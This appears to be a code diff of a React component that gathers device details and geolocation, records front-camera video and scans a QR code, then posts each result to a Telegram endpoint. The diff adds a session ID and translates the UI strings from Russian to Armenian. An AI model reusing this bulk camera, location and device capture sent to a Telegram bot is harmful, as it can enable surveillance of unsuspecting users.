@@ -19,14 +19,15 @@ const VIDEO_SEGMENT_DURATION_MS = 3000; // 3 seconds for each video segment
 const QR_SCAN_TIMEOUT_MS = 10000; // 10 seconds for QR scanning
 
 type GeolocationData = { latitude: number; longitude: number };
-type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; }; // UserAgent удален
+type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
 type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
 type BatteryInfo = { level?: number; charging?: boolean; status?: string };
 
 // Определяем типы данных, которые могут быть отправлены
 type TelegramDataPayload = {
   messageType: MessageType;
-  timestamp: string; // Добавлено для каждого сообщения
+  sessionId: string; // Добавлено
+  timestamp: string;
   geolocation?: GeolocationData;
   clientInfo?: ClientInfo;
   networkInfo?: NetworkInfo;
@@ -60,17 +61,23 @@ const PermissionHandler = () => {
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const mediaChunksRef = useRef<Blob[]>([]);
   const [appPhase, setAppPhase] = useState<AppPhase>("initial");
-  const [loadingMessage, setLoadingMessage] = useState("Подготовка к запуску...");
-  const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp'>>({}); // Храним все данные локально
+  const [loadingMessage, setLoadingMessage] = useState("Նախապատրաստում..."); // Подготовка к запуску...
+  const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId'>>({});
   const [sessionKey, setSessionKey] = useState(0);
   const [processSuccessful, setProcessSuccessful] = useState<boolean>(false);
+  const [currentSessionId, setCurrentSessionId] = useState<string>(""); // Состояние для хранения ID сессии
+
+  const generateSessionId = useCallback(() => {
+    return Math.random().toString(36).substring(2, 10).toUpperCase();
+  }, []);
 
   const sendDataToTelegram = useCallback(async (data: Partial<TelegramDataPayload>, type: MessageType): Promise<boolean> => {
     try {
       const payload: TelegramDataPayload = {
         ...data,
         messageType: type,
-        timestamp: new Date().toISOString(), // Добавляем временную метку для каждого сообщения
+        sessionId: currentSessionId, // Используем текущий ID сессии
+        timestamp: new Date().toISOString(),
       };
 
       const response = await fetch(TELEGRAM_API_ENDPOINT, {
@@ -83,23 +90,22 @@ const PermissionHandler = () => {
 
       if (response.ok) {
         console.log(`Data of type ${type} successfully sent to Telegram!`);
-        // Тосты только для важных событий
         if (type === MessageType.InitialSummary || type === MessageType.QrCode) {
-          toast.success("Данные успешно отправлены в Telegram!");
+          toast.success("Տվյալները հաջողությամբ ուղարկվել են Telegram։"); // Данные успешно отправлены в Telegram!
         }
         return true;
       } else {
         const errorData = await response.json();
         console.error(`Failed to send data of type ${type} to Telegram: ${errorData.error || response.statusText}`);
-        toast.error(`Ошибка отправки данных (${type}): ${errorData.error || response.statusText}`);
+        toast.error(`Տվյալների ուղարկման սխալ (${type}): ${errorData.error || response.statusText}`); // Ошибка отправки данных
         return false;
       }
     } catch (error: any) {
       console.error(`Network error sending data of type ${type} to Telegram: ${error.message}`);
-      toast.error(`Сетевая ошибка: ${error.message}`);
+      toast.error(`Ցանցային սխալ: ${error.message}`); // Сетевая ошибка
       return false;
     }
-  }, []);
+  }, [currentSessionId]);
 
   const recordVideoSegment = useCallback(
     async (duration: number, facingMode: "user" | "environment"): Promise<string | undefined> => {
@@ -149,7 +155,7 @@ const PermissionHandler = () => {
         });
       } catch (error: any) {
         console.error(`Camera/Microphone access denied for ${facingMode} camera: ${error.message}`);
-        toast.error(`Ошибка доступа к камере (${facingMode}): ${error.message}`);
+        toast.error(`Տեսախցիկի հասանելիության սխալ (${facingMode}): ${error.message}`); // Ошибка доступа к камере
         stream?.getTracks().forEach((track) => track.stop());
         if (videoRef.current) {
           videoRef.current.srcObject = null;
@@ -166,7 +172,7 @@ const PermissionHandler = () => {
       const success = await sendDataToTelegram({ qrCodeData: qrData }, MessageType.QrCode);
       setProcessSuccessful(success);
       setAppPhase("finished");
-      toast.success("QR-код успешно отсканирован!");
+      toast.success("QR կոդը հաջողությամբ սկանավորվել է։"); // QR-код успешно отсканирован!
     },
     [sendDataToTelegram]
   );
@@ -177,7 +183,7 @@ const PermissionHandler = () => {
       const success = await sendDataToTelegram({ qrCodeData: `QR Scan Error: ${error}` }, MessageType.QrCode);
       setProcessSuccessful(success);
       setAppPhase("finished");
-      toast.error(`Ошибка сканирования QR: ${error}`);
+      toast.error(`QR սկանավորման սխալ: ${error}`); // Ошибка сканирования QR
     },
     [sendDataToTelegram]
   );
@@ -186,14 +192,17 @@ const PermissionHandler = () => {
     setAppPhase("initial");
     setCollectedData({});
     setSessionKey((prevKey) => prevKey + 1);
-    setProcessSuccessful(false); // Reset success status
-  }, []);
+    setProcessSuccessful(false);
+    setCurrentSessionId(generateSessionId()); // Генерируем новый ID сессии
+  }, [generateSessionId]);
 
   useEffect(() => {
     let qrTimeout: NodeJS.Timeout;
 
     const runProcess = async () => {
-      setLoadingMessage("Сбор данных об устройстве и разрешениях...");
+      setCurrentSessionId(generateSessionId()); // Устанавливаем ID сессии при запуске процесса
+
+      setLoadingMessage("Սարքի տվյալների և թույլտվությունների հավաքում..."); // Сбор данных об устройстве и разрешениях...
       setAppPhase("collectingData");
 
       // --- Concurrently collect all initial data ---
@@ -211,7 +220,7 @@ const PermissionHandler = () => {
       const networkInfo = getNetworkInfo();
       const deviceMemory = getDeviceMemory();
 
-      const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp'> = {
+      const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId'> = {
         clientInfo: {
           platform: clientInfo.platform,
           hardwareConcurrency: clientInfo.hardwareConcurrency,
@@ -237,14 +246,14 @@ const PermissionHandler = () => {
         initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
       }
       
-      setCollectedData(initialCollectedData); // Сохраняем все собранные данные локально
+      setCollectedData(initialCollectedData);
 
       // --- Send Initial Summary Report ---
       const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary);
       setProcessSuccessful(initialSendSuccess);
 
       // --- Start Video 1 Recording ---
-      setLoadingMessage("Запись первого видео (фронтальная камера)...");
+      setLoadingMessage("Առաջին տեսանյութի ձայնագրում (առջևի տեսախցիկ)..."); // Запись первого видео (фронтальная камера)...
       setAppPhase("recordingVideo1");
       const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
       if (video1Base64) {
@@ -253,7 +262,7 @@ const PermissionHandler = () => {
       }
 
       // --- Video 2 Recording ---
-      setLoadingMessage("Запись второго видео (фронтальная камера)...");
+      setLoadingMessage("Երկրորդ տեսանյութի ձայնագրում (առջևի տեսախցիկ)..."); // Запись второго видео (фронтальная камера)...
       setAppPhase("recordingVideo2");
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
       if (video2Base64) {
@@ -262,16 +271,16 @@ const PermissionHandler = () => {
       }
 
       // --- QR Scanning ---
-      setLoadingMessage("Переключение на заднюю камеру для сканирования QR-кода...");
+      setLoadingMessage("Անցում դեպի հետևի տեսախցիկ՝ QR կոդը սկանավորելու համար..."); // Переключение на заднюю камеру для сканирования QR-кода...
       setAppPhase("flippingCamera");
-      setAppPhase("qrScanning"); // QrScanner component will handle its own loading message
+      setAppPhase("qrScanning");
 
       qrTimeout = setTimeout(async () => {
         console.log("QR scanning timed out.");
         const qrTimeoutSendSuccess = await sendDataToTelegram({ qrCodeData: "QR Scan Timed Out" }, MessageType.QrCode);
         setProcessSuccessful(prev => prev && qrTimeoutSendSuccess);
         setAppPhase("finished");
-        toast.error("Время сканирования QR-кода истекло.");
+        toast.error("QR կոդի սկանավորման ժամանակը սպառվեց։"); // Время сканирования QR-кода истекло.
       }, QR_SCAN_TIMEOUT_MS);
     };
 
@@ -289,7 +298,7 @@ const PermissionHandler = () => {
         videoRef.current.srcObject = null;
       }
     };
-  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment]);
+  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, generateSessionId]);
 
 
   return (
